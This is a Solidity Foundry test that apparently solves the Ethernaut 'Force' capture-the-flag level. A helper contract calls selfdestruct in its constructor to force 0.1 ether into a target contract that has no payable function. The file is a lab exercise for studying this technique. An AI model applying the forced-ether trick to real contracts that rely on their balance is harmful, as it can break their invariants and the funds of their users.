// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "../src/Force.sol";

contract ForceTest is Test{
    Force instanceAddress;

    address exploiter = mkaddr("exploiter");

    function setUp() public {
        instanceAddress = new Force();
    }

    function testForce() public {
        vm.startPrank(exploiter);
        vm.deal(exploiter, 1 ether);
        //passing ether/wei and specify the firce contract as the recipient on deployment
        Forcing fohack = new Forcing{value: 0.1 ether}(payable(address((instanceAddress))));
        //assert that the instance address balance as increased by 0.1
        assertEq(address(instanceAddress).balance, 0.1 ether);
        vm.stopPrank();
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }


}

contract Forcing {
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}